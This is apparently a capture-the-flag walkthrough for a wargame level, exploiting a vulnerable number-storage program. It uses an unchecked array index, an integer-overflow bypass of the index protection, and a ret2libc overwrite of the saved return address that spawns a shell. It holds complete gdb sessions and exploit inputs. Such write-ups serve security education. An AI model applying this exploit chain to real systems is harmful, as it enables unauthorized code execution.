# Level07

    $ ./level07 
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!   
    ----------------------------------------------------
    Commands:                                          
        store - store a number into the data storage    
        read  - read a number from the data storage     
        quit  - exit the program                        
    ----------------------------------------------------
    wil has reserved some storage :>                 
    ----------------------------------------------------

    Input command: store
    Number: 42
    Index: 0
    *** ERROR! ***
    This index is reserved for wil!
    *** ERROR! ***
    Failed to do store command
    Input command: read
    Index: 0
    Number at data[0] is 0
    Completed read command successfully
    Input command:

The program store input numbers in an array and let us see the array

After disas, we know the program store in an array of 100 : `int tab[100]` BUT there isn't check on the index, we can store and read at more than 100 and less than 0

    Input command: store
    Number: 42
    Index: 160
    Completed store command successfully
    Input command: read
    Index: 160
    Number at data[160] is 42
    Completed read command successfully

    Input command: store
    Number: 42
    Index: -2
    Completed store command successfully
    Input command: read
    Index: -2
    Number at data[4294967294] is 42
    Completed read command successfully

We can't store in all the tab, some indexes are protected (index % 3 == 0) and the argv and env are cleaned at the beginning...

Without the index protection we can read in the stack, like a format string

Let's find the EIP address with this and maybe use it for a ret2libc! To do it, we need to find the index of EIP on the tab

First, find the address of the tab, of the index 0

Put a breakpoint at the start of the function `read_number` and get the argument, it's the tab

    (gdb) b read_number
    Breakpoint 1 at 0x80486dd
    (gdb) r
    Starting program: /home/users/level07/level07 
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!   
    ----------------------------------------------------
    Commands:                                          
        store - store a number into the data storage    
        read  - read a number from the data storage     
        quit  - exit the program                        
    ----------------------------------------------------
    wil has reserved some storage :>                 
    ----------------------------------------------------

    Input command: read

    Breakpoint 1, 0x080486dd in read_number ()
    (gdb) x/x $ebp+0x8
    0xffffd440:	0xffffd464

`0xffffd440` is the address of where is stored the tab address and `0xffffd464` is the address of the tab itself. To get the index of where is stored the address of the tab on the tab we need to calculate the difference between these 2 addresses

    0xffffd440 - 0xffffd464 = -36

The tab is an int tab (`int tab[100`), so the index is `-36 / 4`

    -36 / 4 = -9

The index of the address of the tab is -9. Try it

    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /home/users/level07/level07 
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!   
    ----------------------------------------------------
    Commands:                                          
        store - store a number into the data storage    
        read  - read a number from the data storage     
        quit  - exit the program                        
    ----------------------------------------------------
    wil has reserved some storage :>                 
    ----------------------------------------------------

    Input command: read

    Index: -9
    Number at data[4294967287] is 4294956132
    Completed read command successfully

`4294956132` == `0xffffd464`, good!

We have the address of the tab, and we can find this address at the runtime with the index `-9`

We need now the index of EIP in the `read_number` function

    (gdb) b *main+520
    Breakpoint 2 at 0x804892b

    (gdb) c
    Continuing.
    Index: -9
    Number at data[4294967287] is 4294956132
    Completed read command successfully
    Input command: read

    Breakpoint 2, 0x0804892b in main ()

Get the frame infos to get EIP

    (gdb) i f
    Stack level 0, frame at 0xffffd630:
    eip = 0x804892b in main; saved eip 0xf7e45513
    Arglist at 0xffffd628, args: 
    Locals at 0xffffd628, Previous frame's sp is 0xffffd630
    Saved registers:
    ebx at 0xffffd61c, ebp at 0xffffd628, esi at 0xffffd620, edi at 0xffffd624, eip at 0xffffd62c


In the stack frame, the address of EIP is `0xffffd62c`. Find the addres by calculating the difference between the tab address and the EIP address like before

    0xffffd62c - 0xffffd464 = 456

    456 / 4 = 114

The index of EIP in the tab seems to be `114`, check it

    Input command: read

    Index: 114
    Number at data[114] is 4158936339
    Completed read command successfully

`4158936339` == `0xf7e45513`

Verify by checking the content of EIP at the same breakpoint

    Breakpoint 2, 0x0804892b in main ()

    (gdb) x/x 0xffffd62c
    0xffffd62c:	0xf7e45513

Ok, it's good. We have the index of EIP. We will try to overwrite it with the system function to do a ret2libc

    (gdb) info function system
    All functions matching regular expression "system":

    Non-debugging symbols:
    0xf7e6aed0  __libc_system
    0xf7e6aed0  system
    0xf7f48a50  svcerr_systemerr

The address of `system()` is `0xf7e6aed0`

BUT... the index 114 is protected. We need to bypass it for write at this index. We can do it with the int overflow

To get 114 by the overflow : (UINT_MAX / 4) + 114

    ( 4294967296 / 4 ) + 114 ) = 1073741938

    1073741938 % 3 = 1

Try it!

    Input command: store
    Number: 42
    Index: 1073741938
    Completed store command successfully

    Input command: read
    Index: 114
    Number at data[114] is 42
    Completed read command successfully

Good, we can write at the index 114 with the number `1073741938`

We know how to overwrite EIP with the address of the system function. Now, we need to put the argument for system : "/bin/sh". The argument will be at index of EIP + 2 to do a ret2libc (system + ret + arg). The index 116 is writable, we just need to find the string in the memory

    (gdb) info proc map
    process 1989
    Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
        0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
        0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

    (gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
    0xf7f897ec
    1 pattern found.

We found a `"/bin/sh"` string at `0xf7f897ec`. In decimal it's equal to `4160264172`

We have all the informations we needed, let's go!

    $ ./level07 
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!   
    ----------------------------------------------------
    Commands:                                          
        store - store a number into the data storage    
        read  - read a number from the data storage     
        quit  - exit the program                        
    ----------------------------------------------------
    wil has reserved some storage :>                 
    ----------------------------------------------------

    Input command: store
    Number: 4159090384
    Index: 1073741938
    Completed store command successfully
    Input command: store
    Number: 4160264172
    Index: 116
    Completed store command successfully
    Input command: quit
    $ whoami
    level08
    $ 

Good!
